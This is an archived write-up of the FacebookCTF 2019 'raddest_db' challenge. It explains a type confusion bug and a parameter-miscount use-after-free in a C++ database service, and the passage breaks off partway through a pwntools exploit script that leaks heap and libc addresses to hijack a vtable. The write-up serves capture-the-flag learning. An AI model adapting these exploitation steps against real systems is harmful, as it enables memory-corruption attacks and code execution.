# raddest_db

**CTF:** FacebookCTF 2019  
**Category:** misc  
**Original writeup:** <https://balsn.tw/ctf_writeup/20190603-facebookctf/> — by **balsn.tw**. All credit goes to the original author; this is an archived copy.

---

The service allow us to create database and store/delete/get some key-value it in. It also has a "getter" feature which allow us to set and run a getter function while getting a key's value.

The program is written is C++ and it's been heavily optimized, which make it pretty hard for us to reverse the binary. We ended up fuzzing the service manually and found a type confusion vulnerability:

create( "A" ) store( "A" , "string" , 2 , "AAAAAAAAAAAAAAAAAAA" ) store( "A" , "int" , 2 , -1 ) print_db( "A" )

The above payload will crash the program. After analyzing the crash, we found that the second value ( -1 ) will overwrite the string pointer of the first value. Later when it want to print out the value, it will treat -1 as a char pointer, thus crashing the program.

With this vulnerability we can first leak the heap address, then create an arbitrary read primitive to leak libc's address:

create( "A" ) store( "A" , "int" , 2 , -1 ) store( "A" , "string" , 2 , "AAAAAAAAAAAAAAAAAAA" ) get( "A" , 2 ) store( "A" , "string" , 1 , "ZZZZZZZZZZZZZZZZZZZ" ) store( "A" , "int" , 1 , float_to_str(struct.unpack( "<d" ,p64(address))[ 0 ]))) get( "A" , 1 )

Now all we need to do is control the damn RIP. We spent a lot of time reversing and fuzzing the program, and finally got another crash:

create d0 getter d0 2 1 delete d0 <-- should be "delete d0 2" instead

We noticed that while setting the getter, the program has miscount the parameter number. For example while handling the delete command, it check if it has 2 parameters ( the command itself and db name ). But in fact it should have 3 parameters instead of 2 ( the command itself, the db name and the key ). So later when the program treat the 3rd argument ( which obviously is a NULL pointer since there is no 3rd argument ) as a string, it will crash the program. This is another vulnerability ( a logic bug ).

We found that there are many cases which the program has miscount the parameter number, and one of them is the empty command, which leads to UAF eventually. We use this to overwrite the vtable and hijack the control flow.

Final exploit:

from pwn import * import sys import time import random import struct import decimal host = 'challenges.fbctf.com' port = 1337 binary = "./raddest_db" context.binary = binary elf = ELF(binary) try : libc = ELF( "./libc.so.6" ) log.success( "libc load success" ) system_off = libc.symbols.system log.success( "system_off = " +hex(system_off)) except : log.failure( "libc not found !" ) def create (name) : r.recvuntil( ">>> " ) r.sendline( "create " + name) pass def store (db,t,key,value) : r.recvuntil( ">>> " ) r.sendline( "store " + db + " " + t + " " + str(key) + " " + str(value)) pass def get (db,key) : r.recvuntil( ">>> " ) r.sendline( "get " + db + " " + str(key)) pass def destroy (db) : r.recvuntil( ">>> " ) r.sendline( "destroy " + db) def li () : r.recvuntil( ">>> " ) r.sendline( "list databases" ) def empty (db) : r.recvuntil( ">>> " ) r.sendline( "empty " + db) def delete (db,key) : r.recvuntil( ">>> " ) r.sendline( "delete " + db + " " + str(key)) def pr (db) : r.recvuntil( ">>> " ) r.sendline( "print " + db) def echo (data) : r.recvuntil( ">>> " ) r.sendline( "echo " + data) def getter (db,key,ops= 0 ) : r.recvuntil( ">>> " ) r.sendline( "getter " + db + " " + str(key) + " " + str(ops)) def show (start,end) : pass r.recvuntil(start) data = r.recvuntil(end)[:-len(end)] return data def float_to_str (f) : ctx = decimal.Context() ctx.prec = 20 d1 = ctx.create_decimal(repr(f)) return format(d1, 'f' ) if len(sys.argv) == 1 : r = process([binary, "0" ], env={ "LD_LIBRARY_PATH" : "." }) else : r = remote(host ,port) if __name__ == '__main__' : r.recvuntil( ">>> " ) r.recvuntil( ">>> " ) r.recvuntil( ">>> " ) create( "D" *( 0x410 )) destroy( "D" * 0x410 ) create( "A" ) store( "A" , "int" , 0 , -1 ) store( "A" , "string" , 0 , "A" * 19 ) get( "A" , 0 ) heap = int(r.recvuntil( "
